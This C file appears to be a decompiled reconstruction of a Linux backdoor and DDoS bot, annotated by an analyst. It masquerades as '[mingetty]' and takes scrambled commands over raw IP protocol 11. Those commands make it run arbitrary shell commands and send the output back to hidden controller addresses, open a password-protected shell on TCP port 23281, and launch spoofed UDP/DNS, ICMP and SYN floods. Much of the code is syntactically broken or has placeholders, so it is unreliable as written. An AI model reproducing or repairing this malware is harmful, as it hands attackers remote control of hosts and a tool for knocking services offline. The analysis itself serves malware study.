#include <stdio.h>
#include <sys/socket.h>
#include ...


#define VERSION 0
#define TYPSERV 1
#define TOTLEN1 2
#define TOTLEN2 3
#define IDENTIF 4
#define SRCADDR_1 8
#define SRCADDR_2 9
#define SRCADDR_3 10
#define SRCADDR_4 11
#define DESTADDR_1 16
#define DESTADDR_2 17
#define DESTADDR_3 18
#define DESTADDR_4 19
#define PAYLOAD_1 20
#define PAYLOAD_3 22

// Available modes for sending response messages
#define SMODE_ONE_ADDRESS 0
#define SMODE_HIDDEN_ADDRESS 1
#define SMODE_RANDOM_ADDRESSES 2


// Global variables
int pid1; // dword_0_807E774
int pid2; // dword_0_807E770

struct sockAddr hostSockAddr;

char localIpAddr[4];

int lastRequestedAttack;

int sendMode // dword_0_807E784




int main(int argc, char *argv[])
{

	char ip11Packet[2048];
	char payload[400];
	char tmp_buf[400];
	char addrArray[40];
	char buff2[256];
	char buff3[????];
	
	int hSocket;
	int hSocketAcc;
	struct sockaddr_in sin;
	struct sockaddr_in sin2;
	int lenSin;
	
	void *True;
	
	FILE *fp;

	True = (void *)1;
	lenSin = 16
	
	if (!geteuid()) 
		exit(-1); 
	
	strcpy(argv[0],"[mingetty]");
	
	signal(SIGCHLD, SIG_IGN);
	if (fork() != 0)  // I'm the father
		exit(0);  // probably exit(0);

	setsid();
	signal(SIGCHLD, SIG_IGN);
	if (fork() != 0) // I'm the father
		exit(0); // probably exit(0)
	
	chdir('/');
	close(0);
	close(1);
	close(2);	

	pid1 = 0;
	pid2 = 0;
	lastRequestedAttack = 0;
		
	
	srand(time(0)); 
	
	hSocket = socket(AF_INET, SOCK_RAW, 11);  
	signal(SIGUP, SIG_IGN);
    signal(sigterm, SIG_IGN);
    signal(sigup, SIG_IGN);
    signal(sigup, SIG_IGN);
  
    int length;
    
    while (1) {
    	
	length = recv(hSocket, ip11Packet, 2048, 0);
	
	if ((ip11Packet[9] != 11) || (ip11Packet[PAYLOAD_1] != 2) || (length <= 200)) {
		usleep(10000);
    	} 
    	else {
    		// descramble the packet's payload
    		descramble(length - 22, &ip11Packet[PAYLOAD_3], payload);
    		
		if (payload[1] > 12) {
			usleep(10000);
			continue;
		}
		
		switch (payload[1]) {
			
		// 1: Returns process info:
		//    - last command sent,
		//    - if it's the father or the child
		case 1:
			ip11Packet[0] = 0;
			ip11Packet[1] = 1;
			ip11Packet[2] = 7;
			if (pid1 != 0) {
				ip11Packet[3] = 1;
				ip11Packet[4] = lastRequestedAttack;
			}
			else {
				ip11Packet[3] = 0;
			}
			scramble(400, ip11Packet, payload);
			sendDataTo(addrArray, payload, (rand() % 201) + 400);

			break;

		// 2: Creates an array of IP addresses used as destinations of future communications.
		//    Random addresses are generated to hide the client IP address.
		//    0: Just one address, sent in the payload;
		//    1: 9 random addresses and, in a random place, the 10th address, sent in the payload;
		//    2: 10 random addresses.
		case 2:

			sendMode = payload[2];
	
			localIpAddr[0] = ip11Packet[DESTADDR_1];
			localIpAddr[1] = ip11Packet[DESTADDR_2];
			localIpAddr[2] = ip11Packet[DESTADDR_3];
			localIpAddr[3] = ip11Packet[DESTADDR_4];
	
			srand(time(0));
			edi = (rand() % 10);
			
			esi = 0;
	
			for (int i = 0; i < 10; ++ i) {
				if (i != edi) {
					
					if(sendMode == SMODE_RANDOM_ADDRESSES) {
						addrArray[0 + esi] = payload[3];
						addrArray[1 + esi] = payload[4];
						addrArray[2 + esi] = payload[5];
						addrArray[3 + esi] = payload[6];
					} else {
						addrArray[0 + esi] = (char)rand();
						addrArray[1 + esi] = (char)rand();
						addrArray[2 + esi] = (char)rand();
						addrArray[3 + esi] = (char)rand();
					}
				}
				
				esi += 4;
			}
			
			if (sendMode == SMODE_ONE_ADDRESS) edi = 0;
			if (sendMode != SMODE_RANDOM_ADDRESSES) {
				edi *= 4;
				
				addrArray[0 + edi] = payload[3];
				addrArray[1 + edi] = payload[4];
				addrArray[2 + edi] = payload[5];
				addrArray[3 + edi] = payload[6];
			}
			
			break;

		// 3: Permits to execute an arbitrary command and redirects stdout and stderr 
		//    on a temp file, which is then sent to the hacker.
		case 3:

			pid2 = fork();
			if (pid2) break;
			
			setsid();
			signal(sigusr2,1);
			if (fork()) {
				sleep(16);
				kill(pid2, SIG_KILL);
				exit(0);
			}
			
			for (int i = 0; i < 398; ++ i) payload[i] = payload[2 + i];
			
			// Executes the command specified in the message and redirects stdout and stderr
			// on the file /tmp/.hj237349
			sprintf(ip11Packet,"/bin/csh -f -c \"%s\" 1> %s 2>&1", payload, "/tmp/.hj237349");
			system(ip11Packet);
			
			// Opens the file /tmp/.hj237349 and copies it in the buffer ipllPacket
			fp = fopen("/tmp/.hj237349", "rb");
			
			if (fp != NULL) {
				edi = 0;
			
				// Send the content in packets of 398 bytes, waiting 400 seconds
				// between each operation.
				do {
					esi = fwrite(ip11Packet, 1, 398, fp);
					ip11Packet[esi] = 0;
					
					for (i = 0; i < 398; ++ i) payload[2 + i] = ip11Packet[i];
					
					// The first packet has the "command_code" field equals to 3,
					// all others equals to 4.
					if (edi == 0) {
						payload[1] = 3;
						edi = 1;
					} else
						payload[1] = 4;
				
					scramble(400, payload, tmp_buf);
					sendDataTo(addrArray, tmp_buf, (rand() % 201) + 400);
					usleep(400000);
					
				} while (esi);
				
				fclose(fp);
				unlink("/tmp/.hj237349");
			}
			
			exit(0);
			
			
		// 4: Executes a UDP flood attack, getting parameters from the message payload
		case 4:
		
			if (pid1) break;
			
			lastRequestedAttack = 4;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+9];  //Va fuori buffer?!?
			
			// Executes the attack, passing the received parameters
			doUDPflood2(payload[2],
				      payload[3],
				      payload[4],
				      payload[5],
			              0,
			              payload[6],
			              payload[7],
			              payload[8],
			              buff2);

			exit(0);
			
		
		// 5: Executes a UDP attack, getting parameters from the message payload
		case 5:
				
			if (pid1) break;
			
			lastRequestedAttack = 5;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+13];  //Va fuori buffer?!?
			
			// Executes the attack, passing the received parameters
			doUDPattack(payload[2],
				      payload[3],
				      payload[4],
				      payload[5],
			              payload[6],
			              payload[7],
			              payload[8],
			              payload[9],
			              payload[10],
			              payload[11],
			              payload[12],
			              buff2);

			exit(0);
	
		// 6: Creates an interactive shell listening on 23281 TCP port
		case 6:
		
			if (pid1) break;
			
			lastRequestedAttack = 6;
			
			signal(SIGCHLD, SIG_IGN);

			pid1 = fork();
			if (pid1) break;
			
			setsid();
			signal(SIGCHLD, SIG_IGN);


			sin.sin_family = 2;
			sin.sin_port = 23281; // listening port of the TCP server
			sin.sin_addr = 0;
	
			True = (void *)1;
			hSocket = socket(AF_INET,SOCK_STREAM,0);
			signal(SIGUP, SIG_IGN);
		    	signal(sigterm, SIG_IGN);
		    	signal(sigup, SIG_IGN);
		    	signal(sigup, SIG_IGN);		
		    	
		    	setsockopt(hSocket,SOL_SOCKET,SO_REUSEADDR,True,4);
			bind(hSocket,sin,16);
			listen(hSocket,3);
			
			do {
				hSocketAcc = accept(hSocket,sin2,lenSin);
				if (!hSocketAcc)
					exit(0);
			}
			while (fork());
			
			recv(hSocketAcc,buff3,19,0);
			
			for(int i=0;i<19;i++) {
				if (buff3[i] == 10 || buff3[i] == 13)
					buff3[i] = 0;
				else 
					buff3[i]++; 
			}
			
			// last byte of the received packet must be null and
			// first 6 bytes must be "SeNiF" --> all substituted 
			// with the corresponding byte minus 1
			if (strncmp(buff3,"TfOjG\x0",6)) {
				// The received packet is not correct
				send(hSocketAcc,"\xff\xfb\x01\x00",4,0);
				close(hSocketAcc);
				exit(1);
			}
			else {
				// The received packet is OK
				fcntl1(hSocketAcc,F_DUPFD);
				fcntl1(hSocketAcc,F_getFD);
				fcntl1(hSocketAcc, F_SETFD);
				
				setenv("PATH", "/sbin:/bin:/usr/sbin:/usr/bin:/usr/local", 1);
				unsetenv(HISTFILE);
				setenv("TERM", "linux", 1);
				
				execl("/bin/sh", "sh", 0);
				
				close(hSocketAcc);
				exit(0);
			}
			
		// 7: Executes a command:  /bin/csh -f -c <command> 
		//    After the command_code there must be the string with the command
		case 7:
		
			pid2 = fork();
			if (pid2) // if I'm the father
				break;
			// I'm the child
			setsid();
			signal(SIGCHLD, SIG_IGN);
			if (fork()) { // I'm the father
				sleep(1200);
				kill(pid2, SIGKILL);
				exit(0);
			}
			// I'm the child
			for (int i = 0; i < 398; i++)
				payload[i] = payload[i + 2];  //shifta il payload di due caratteri verso l'alto
			
			sprintf(ip11Packet, "/bin/csh -f -c \"%s\"", payload);
			system(ip11Packet);
			exit(0);
			
		// 8: Kills the child process
		case 8:
		
			if (pid1) {
				kill(pid1, 9);
				pid1 = 0;
			}
			
			break;				
			
			
		// 9: Executes a UDP flood attack, getting parameters from the message payload
		case 9:
		
			if (pid1) break;
			
			lastRequestedAttack = 9;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+10];  // out of buffer ?!
			
			// Executes the attack, passing the received parameters
			doUDPflood2(payload[2],
				      payload[3],
				      payload[4],
				      payload[5],
			              payload[6],
			              payload[7],
			              payload[8],
			              payload[9],
			              buff2);

			exit(0);

			
		// 10: Executes a syn flood attack, getting parameters from the message payload
		case 10:
		
			if (pid1) break;
			
			lastRequestedAttack = 10;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+14];  // out of buffer ?!
			
			// Executes the attack, passing the received parameters
			synFlood(payload[2],
				 payload[3],
				 payload[4],
				 payload[5],
			         payload[6],
			         payload[7],
			         payload[8],
			         payload[9],
			         payload[10],
			         payload[11],
			         payload[12],
			         0,
			         payload[13],
			         buff2);

			exit(0);
		
		// 11: Executes a syn flood attack, getting parameters from the message payload
		case 11:
		
			if (pid1) break;
			
			lastRequestedAttack = 11;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+15];  // out of  buffer ?!
			
			// Executes the attack, passing the received parameters
			synFlood(payload[2],
				 payload[3],
				 payload[4],
				 payload[5],
			         payload[6],
			         payload[7],
			         payload[8],
			         payload[9],
			         payload[10],
			         payload[11],
			         payload[12],
			         payload[13],
			         payload[14],
			         buff2);

			exit(0);
			
		// 12: Executes a UDP flood attack, getting parameters from the message payload
		case 12:

			if (pid1) break;
			
			lastRequestedAttack = 12;
			
			pid1 = fork();
			if (pid1)
				break;
			for (int i = 0; i < 255; i++)
				buff2[i] = payload[i];
			for (int j = 0; j < 255; j++)
				buff2[j] = buff2[j+14];  // out of buffer ?!
			
			// Executes the attack, passing the received parameters
			doUDPflood(payload[2],
				      payload[3],
				      payload[4],
				      payload[5],
			              payload[6],
			              payload[7],
			              payload[8],
			              payload[9],
			              payload[10],
			              payload[11],
			              payload[12],
			              payload[13],
			              buff2);

			exit(0);

				
		} // End Switch
		
		usleep(10000);

    	} //End Else

    } // End While
		

} //End Main

/**
 * Send some data to destAddr IP, n is the data string length.
 * NOTE. destAddr can also be an array (10 elements) of IP addresses
 *       (it depends on the global variable sendMore)
 */
int sendDataTo(char *destAddr, char *data, int n)
{
		if (sendMode == SMODE_ONE_ADDRESS) { //payload[2] == 0
			sendIpPacket(localIpAddr, destAddr, data, n);
		} else {
			for(int i = 0; i < 10; i ++) {
				usleep(4000);
				sendIpPacket(localIpAddr, destAddr[4 * i], data, n);
			}
		}
		return 1;
}

/**
 * Calculate the checksum of an IP header
 */
short int crc(short int * hdr, int len)
{
	int tmp=0;
	short int tmp2;
	for (int i=0; len > 1; len -=2) {
		tmp += hdr[i];
		i+=2;
	}
	if (len == 1) {
		tmp += (char)hdr[i];
	}
	tmp2 = tmp;
	tmp = sar(tmp,16) + tmp2;
	tmp += sar(tmp,16);
	return not(tmp);
}

/**
 * Sends a packet to the specified dstip putting a consistent
 * ip header in the payload and the specified data
 */
int sendIpPacket(int srcip, int dstip, char * data, int len)
{
		char * buf, pktPayload, pktData;
		struct sockaddr * sckaddr;
		int sock_id;
			
		sock_id = socket(AF_INET,SOCK_RAW,255);
		if (sock_id == -1) 
				return 0;
		if (!(buf = malloc(len+23)))
				return 0;

		pktPayload = & buf[20];
		pktData = & buf[22];
		(int)buf[12] = htonl(srcip);
		(int)buf[16] = htonl(dstip);
		sprintf(addr_str, "%d.%d.%d.%d", buf[16], buf[17], buf[18], buf[19]);
		sckaddr[4] = getAddrOf(addr_str);
		sckaddr[0] = PF_INET;
		buf[0] = 0x45;		/* IPV4, hdrlen=20*/
		buf[8] = 250;		/* ttl = 250 */
		buf[9] = 12;		/* nexhdr = 12 */
		(short int)buf[2] = htons(len+22);
		buf[1] = 0;
		buf[4] = htons(rand());
		buf[6] = 0;
		buf[10] = crc(buf, 20);	/* fix the crc */
		pktPayload[0] = 3;
		memcpy(pktData, data, len);
		
		if (sendto(sock_id, buf, len + 22, 0, sckaddr, 16) == -1) {
				free(buf);
				return 0;
		}
		free(buf);
		close(sock_id);
		return 1;
}

/**
 * Return the pointer to the sockaddr struct corresponding to
 * the IP address or host name passed as parameter.
 * Otherwise 0 in case of failure.
 */
struct sockaddr * getAddrOf(char * hostName)
{
		struct hostent * he = gethostbyname(hostName);
		if (!he)
			return 0;
		memcpy(&hostSockAddr, he->h_addr_list[0], e->h_length);
		return (&hostSockAddr);
}

/**
 * Executes a flooding of the specified target, resolving the host name
 * and using packets of random length and content (9 possible size).
 */
int doUDPflood2(char src1,char src2, char src3, char src4, 
               char port1, char port2, int cnt, int ressrchost_flag, 
	       char * hostname) 
{
	int scok_id;
	struct sockaddr sckaddr;
	char pak[1024];
	char buf[496];
	char hostIPstr[16];
	int pktlenght[9];

	int int0, int1, int2;

	memcpy(unk_0_8067698, pktlenght, 36);  /* array of sizes: 21, 21, 20, 21, 21, 25, 20, 20, 20 */
	memcpy(unk_0_80676bc, buf, 496);       /* payloads for the packets [like DNS query] */
    	var_654 = 1;
    

	sckaddr[0] = PF_INET;
	sckaddr[2] = 0;

	if (cnt)
        cnt--; /* every cnt packets, waits before sending the next */

	sock_id = socket(AF_INET, SOCK_RAW, 255);
	if (!sock_id)
		return 0;

	int1 =0;
        int0 =0;
	memset(pkt, 0, 1024);

	for (;;) {
        int i;
        
		do {
			i=0;
			if (ressrchost_flag) 
				if (int1<=0) {
					struct hostenv * he = gethostbyname(hostname);
					if (!he) {
						sleep(600);
						i = 1;
					}
					else {
						pkt[12] = he->h_addr_list[0];
						int1 = 40000; /* every int1 packets, resolves the name */
					}
				}
		} while (i);
        
        for (i=0, int2=0; i<9; i++, int2+=40) 
        {
            int tmp;
            
            if (var_654 ==1) {
                var_654=0;
                tmp = rand() %8000;
            }
            else  
                tmp = 0;
            while (dword_0_806d22c[tmp]) {
                scksddr[4] = dword_0_806d22c[tmp]; 	/* array of 8000 "random" IP addresses */
                memcpy(&pck[28], &buf[int2], pktlenght[i]);
                pck[28] = rand()%255;
                pck[29] = rand()%255;
                
                if ((port1) && (port2)) 
                	(short int) pkt[20] = htons(port1 << 8 | port2);
                else 
                    (short int) pkt[20] = rand() % 30000; /* src port: parameter or random */
                (short int) pkt[22] = 0x3500; /* dst port: dns*/
                (short int)pkt[24] = htons(pktlenght[i]);
                pkt[0] = 0x45; /* ipv4, hdrlen=20*/
                pkt[8] = 120 + rand() % 130; /*ttl*/
                (short int)pkt[4] = rand % 255; /*ip_id*/
                pkt[9] = 17; /*UDP*/
                pkt[6] = 0;
                (short int)pkt[2] = 28 + pktlenght[i]; /*total lenght*/
                if (reshost_flag) {
                    pkt[12] = src1;
                    pkt[13] = src2;
                    pkt[14] = src3;
                    pkt[15] = src4;
                }
                (int)pkt[16] = dword_0_806d22c[tmp];
                (short int)pkt[10] = crc(pkt,20);
                sendto(sock_id, pkt, pktlenght[i] + 28, 0, sckaddr, 16);
				
				tmp++;				                
				if (!cnt) {
					usleep(300);
					int1--;
				}
				else {
					if (cnt == int0) {
						usleep(300);
						int0 = 0;
						int1--;
					}
					else 
						int0++;
				}

            }
	}
            
    }
}

/**
 * Executes a flooding of the specified target, resolving the host name and using
 * the specified source address, with packets of random length and content (9 possible size).
 */
int doUDPflood(char dst1,char dst2, char dst3, char dst4, char src1, 
               char src2, char src3, char src4, int cnt, char port1, 
               char port2, int sredesthost_flag, char * hostname) 
{
	int scok_id;
	struct sockaddr sckaddr;
	char pak[1024];
	char buf[496];
	char hostIPstr[16];
	int pktlenght[9];

	int int0, int1, int2;

	memcpy(unk_0_8067698, pktlenght, 36);
	memcpy(unk_0_80676bc, buf, 496);

	sckaddr[0] = PF_INET;
	sckaddr[2] = 0;
	if (!resdesthost_flag) 
			sprintf(hostIPstr, "%d.%d.%d.%d", dst1, dst2, dst3, dst4);

	if (cnt)
        cnt--; /* every cnt packets, waits before sending the next */
	
	sock_id = socket(AF_INET, SOCK_RAW, 255);
	if (!sock_id)
		return 0;

	int1 =0;
    int0 =0;
	memset(pkt, 0, 1024);

	for (;;) {
        int i;
        
		do {
			i=0;
			if (resdethost_flag) 
				if (int1<=0) {
					struct hostenv * he = gethostbyname(hostname);
					if (!he) {
						sleep(600);
						i = 1;
					}
					else {
						sckaddr[4] = he->h_env[0];
						pkt[16] = sckaddr[4];
						int1 = 40000; /* every int1 packets, resolves the name */
					}
				}
		} while (i);
        
        for (i=0, int2=0; i<9; i++, int2+=40) 
        {
            if (!resdesthost_flag)
                sckaddr[4] = inet_addr(hostIPstr);

            memcpy(&pkt[28], &buf[int2], pktlenght[i]);
            pkt[28] = rand() % 255;
            pkt[29] = rand() % 255;

            if ((port1) && (port2)) 
                (short int) pkt[20] = htons(port1 << 8 | port2);
            else 
                (short int) pkt[20] = rand() % 30000; /* src port: parameter or random*/
            (short int) pkt[22] = 0x3500; /* dst port: dns*/
            (short int) pkt[24] = htons(pktlenght[i]);
            (short int) pkt[26] = 0; /*UDP crc, missing !!!*/

            if (src1 && src2 && src3 && src4) {
                pkt[12] = src1;
                pkt[13] = src2;
                pkt[14] = src3;
                pkt[15] = src4;
            }
            else {
                int tmp;
                tmp = rand() % 255;
                if (!tmp) tmp++;
                pkt[12]= tmp;
                tmp = rand() % 255;
                if (!tmp) tmp++;
                pkt[13]= tmp;
                tmp = rand() % 255;
                if (!tmp) tmp++;
                pkt[14]= tmp;
                tmp = rand() % 255;
                if (!tmp) tmp++;
                pkt[15]= tmp;
            } /*src ip: parameter or random*/

            pkt[0] = 0x45; /* ipv4, hdrlen=20*/
            pkt[8] = 120 + rand() % 130; /*ttl*/
            (short int)pkt[4] = rand % 255; /*ip_id*/
            pkt[9] = 17; /*UDP*/
            pky[6] = 0;
            (short int)pkt[2] = 28 + pktlenght[i]; /*total lenght*/

            pkt[10] = crc(pkt, 20); 

            sendto(sock_id, pkt, pktlenght[i] + 28, 0, sckaddr, 16);
            if (!cnt) {
                usleep(300);
                int1--;
            }
            else {
                if (cnt == int0) {
                    usleep(300);
                    int0 = 0;
                    int1--;
                }
                else 
                    int0++;
            }
        }
            
    }
}

/**
 * Executes an ICMP or UDP flood (on the specified port) depending on the flag,
 * on the specified target, using the specified source address and
 * resolving the specified address depending on the flag
 */
int doUDPattack (
	int isICMP,
	int port,
	char arg_8,
	char arg_c,
	char arg_10,
	char arg_14,
	char arg_18,
	char arg_1c,
	char arg_20,
	char arg_24,
	int resHostName_flag,
	char * hostname)

{
		char srcipstr[16];
		char dstipstr[16];
		char pkt[30];
		int ebx, esi, sock_id;
		struct sockaddr sckaddr;
	
		sckadd[0] = 2; /*PF_INET*/
		sckadd[2] = htons(rand()%255);
		sprintf(srcipstr,"%d.%d.%d.%d",arg_18,arg_1c,arg_20,arg_24);
		if (!resHostName_flag) {
			sprintf(dstipstr,"%d.%d.%d.%d",arg_8,arg_c,arg_10,arg_14);
			sckaddr[4] = inet_addr(dstipstr);
		}

		sock_id = socket(AF_INET,SOCK_RAW,255);
		if (sock_id<=0)
			return 0;
		
		pkt[0] = 0x45; /*ipv4,hdr len =20*/
		pkt[2] = 0x1c28; /*pkt lenght= 10268*/
		pkt[4] = 0x5504; /* id = 1109*/
		pkt[8] = (rand() % 130) + 120; /*ttl*/
		pkt[12] = inet_addr(srcipstr);
		if (!resHostName_flag) 
			pkt[16] = inet_addr(dstipstr);

		pkt[6] = 0xFE1F; /*don't fragment && more fragment , fragoff!=0*/ 
		pkt[10] = 0;
		if (isICMP) {
			pkt[9] = 1; /* next header =1 (ICMP)*/
			pkt[20] = 8; /* type = 8 (echo request)*/
			pkt[21] = 0;
			(short int) pkt[22] = 0; /**/
			(chort int) pkt[22] = crc(pkt[20],9);
		}
		else {		
			pkt[9] =  0x11; /*next header: protocol 17UDP*/
			pkt[20] = htons(rand()%255); /*srcport: random*/
			pkt[22] = htons(port); /*dstport: arg_4*/
			pkt[24] = 0x900;	/*len = 2304*/
			pkt[26] = crc(buf[20],9) /*crc UDP wrong ?!*/
			pkt[8] = 0x61;
		}
		
		(short int) pkt[10] = crc(pkt, 20); /*IP checksum*/
		ebx = 0;

		for (;;) {
			esi = 0;
			if (resHostName_flag) {
				if (ebx<=0) {
					struct hostent * he;
					if (he = gethostbyname(hostname)) {
						int tmp;
						memmove2(he->h_addr_list[0],tmp,4)
						pkt[16] = tmp; /*destip*/
						sktaddr[4] = pkt[16];
						ebx = 40000;
					}
					else {
							sleep(600);
							inc(esi);
					}
				}
			}
	
			if (!esi) {
					sendto(sock_id,pkt,30,0,sktAddr,16)
					sendto(sock_id,pkt,30,0,askAddr,16)
					usleep(20)
			}
			ebx--;
		}
}

/**
 * Attacks the specified IP address (syn flood) on the specified port, resoving (if required)
 * the symbolic name using the source IP address, and waiting for a timeout. It does NOT end !!!
 */
int synFlood(
	int arg_0, // destination
	int arg_4,
	int arg_8,
	int arg_C,
	int arg_10, // dest. port 1
	int arg_14, // port 2
	int usefixsrcaddr_flag,
	int arg_1C, // source
	int arg_20,
	int arg_24,
	int arg_28,
	int cnt,
	int resolvdestaddr_flag,
	char hostName) {


	char srchostNameNum[12];
	int sock_id;
	char pkt2[40];
	char pck[40];
	struct sockadr sckaddr;
	int edi, esi;
		
		if (cnt != 0)  
				cnt--;
		srand(time(0));
		sckaddr[0] = PF_INET;
		sckaddr[2] = htons(rand()% 255);
		if (!resolvdestaddr_flag) {
			sprintf(sdtHostNamestr,"%d.%d.%d.%d",arg_0,arg_4,arg_8,arg_c)
			sckaddr[4] = inet_addr(sdtHostNamestr);
		}

		pck[0]= 45h;			/*IPV4, hdrlen=20*/
		(short int) pck[2]= 2800h;		/*total len = 40*/
		pkt[1] = 0;
		sock_id = socket(AF_INET,SOCK_RAW,255);
		if (!sock_id)
			return 0;
		if (usefixsrcaddr_flag) {
			sprintf(scrhostNameStr,"%d.%d.%d.%d",arg_1c,arg_20,arg_24,arg_28);
		}
		
		if (!resolvdestaddr_flag) {
			pkt[16] = inet_addr(sdtHostNamestr);	/*dstip = sdtHostNamestr*/
		}


		pkt[6] = 0;
		pkt[9] = 6; /*protocol = 6 TCP*/

		pkt[32] = (pkt[32] & 15)| 0x50;
		pkt[28] = 0;
		var[32] = 0x50 /*data offset = 20*/
		pkt[33] = 2;	/*tcp flag = syn*/
		pkt[36] = 0;	/**/
		pkt[22] = htons((arg_10 >> 8) + arg_14); /*dest port*/

		pkt2[8] = 0;
		
		if (!resolvdestaddr_flag) 
				pkt2[16]= pkt[16]; /*dstip = pkt_dstip*/
		pkt[9] =6; /*protocol =6*/ 
		pkt[10] = 0x1400; 
		edi = 0;
		esi = 0;

		for (;;) {
			do {
				struct hosthent *he;
				flag_ptr = 0;
				if (resolvdestaddr_flag) {
					if (esi>0) {
						if (!(he = gethostbyname(hostname))) {
							sleep(600);
							flag_ptr = 1;
						}
						else {
							memmove2(he->h_addr_list[0],pkt[16],4);
							sckaddr[4] = pkt[16];
							pkt2[16] = pkt[16];
							esi = 40000;
						}
					}
				}
			while (flag_ptr);

			(short int) pkt[4] = htons((rand() % 3089) + 2); /*pket id*/
			(short int) pkt[34] = htons((rand() % 1401) + 200); /*tcp win*/
			(short int) pkt[20] = htons((rand() % 40000) + 1); /*srcport*/
			(int) pkt[24] = htonl((rand() % 40000000) + 1); /*tcp seq number*/
			pkt[8]= (rand() % 116) + 125; /*ttl*/
			if (!usefixsrcaddr_flag)
				sprintf(srchostNameStr,"%u.%u.%u.%u",(rand() % 255),(rand() % 255),(rand() % 255),(rand() % 255));

			pkt2[12] = inet_addr(srchostNameStr); /*srcip = random*/
			(short int) pkt[36] = 0;
			(short int) pkt[10] = 0;
			memmove2(pkt[20],pkt2[20],20); /*copy hdr tcp on 2# packet*/
			pkt[36] = crc(pkt2, 32); /* set crc of tcp pseudo-header*/
			pkt[10]	= crc(pkt, 20); /* set crc for pkt*/
	
			sendto(sock_id,pck,40,0,sckaddr,16)
			if (cnt) {
				if (cnt == edi) { 
					usleep(300);
					edi = 0;
				}
				else {
					edi++;
					continue;
				}
			}
			else 
				usleep(300);
			esi--;
			continue;
	}
}

/**
 * Scramble the in buffer (of length len) and put the result in the out buffer
 */
void scramble(int len, char *in, char *out)
{	
	int i;
	out[0] = in[0] + 23;
	for (i = 1; i < len; ++ i) out[i] = in[i] + out[i - 1] + 23;
}

/**
 * De-scramble the in buffer (of length len) and put the result in the out buffer
 */
void descramble(int len, char *in, char *out)
{
	int i;
	out[0] = in[0] - 23;
	for (i = 1; i < len; ++ i) out[i] = in[i] - in[i - 1] - 23;
}
